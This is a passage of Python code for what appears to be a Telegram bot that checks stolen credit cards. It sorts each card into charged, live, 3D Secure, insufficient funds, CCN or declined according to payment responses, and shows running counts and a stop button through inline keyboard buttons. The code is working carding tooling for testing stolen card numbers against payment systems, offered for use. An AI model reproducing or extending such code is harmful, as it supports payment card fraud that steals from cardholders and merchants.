	                cards_3D_secure.append(card)
#——————————————————————#
	            elif "lock_timeout" in response.text:
	                time.sleep(1)
#——————————————————————#
	            else:
	                msg_text = "UnKnown"
	                bot.send_message(chat_id=message.chat.id,text=f"Hi, I Got Card With Unknown response:\n{card}")
	                
	                print(response.text)
	                print("="*60)
#——————————————————————#
	            reply_markup = create_reply_markup(card, len(not_working_cards),len(live_cards), len(working_cards), len(cards_3D_secure) ,len(insufficient_founds),len(ccn_cards),msg_text,len(cards))
	            try:
	                bot.edit_message_text(
	                    chat_id=message.chat.id,
	                    message_id=msg.message_id,
	                    text="Checking in progress Wait...",
	                    reply_markup=reply_markup
	                )
	            except telebot.apihelper.ApiTelegramException:
	                time.sleep(2)
	    except Exception as e:
	        bot.reply_to(message, "An error occurred while checking the cards.")
	        print(str(e))
	        pass
#——————————————————————#
	def create_reply_markup(current_card, num_not_working, num_live, num_working,  num_cards_3D_secure, num_insufficient_founds, num_ccn, message_text, All):
	    markup = telebot.types.InlineKeyboardMarkup()
	
	    current_card_button = telebot.types.InlineKeyboardButton(text=f"⌜ • {current_card} • ⌝", callback_data="current_card")
	    
	    message_button = telebot.types.InlineKeyboardButton(text=f" ⌯ {message_text} ⌯ ", callback_data="message")
	    
	    working_button = telebot.types.InlineKeyboardButton(text=f"Charged: {num_working}", callback_data="working")

	    live_button = telebot.types.InlineKeyboardButton(text=f"Live: {num_live}", callback_data="live")
	    
	    insufficient_button = telebot.types.InlineKeyboardButton(text=f"Insuff Founds: {num_insufficient_founds}", callback_data="no thing")
	    
	    ccn_button = telebot.types.InlineKeyboardButton(text=f"CCN: {num_ccn}", callback_data="no thing")
		    
	    all_button = telebot.types.InlineKeyboardButton(text=f"⌞ • All: {All} ┇ Declined: {num_not_working} ┇2-AF: {num_cards_3D_secure} • ⌟", callback_data="no thing")
	
	    stop_button = telebot.types.InlineKeyboardButton(text="〄 STOP 〄", callback_data="stop")
	
	    markup.row(current_card_button)
	    markup.row(message_button)
	    markup.row(working_button,live_button)
	    markup.row(insufficient_button,ccn_button)
	    markup.row(all_button)
	    markup.row(stop_button)
	
	    return markup
	
	@bot.callback_query_handler(func=lambda call: True)
	def handle_callback_query(call):
	    if call.data == "stop":
	        global is_card_checking
	        is_card_checking = False
	        bot.answer_callback_query(call.id, text="Card checking stopped.")
	
bot.polling()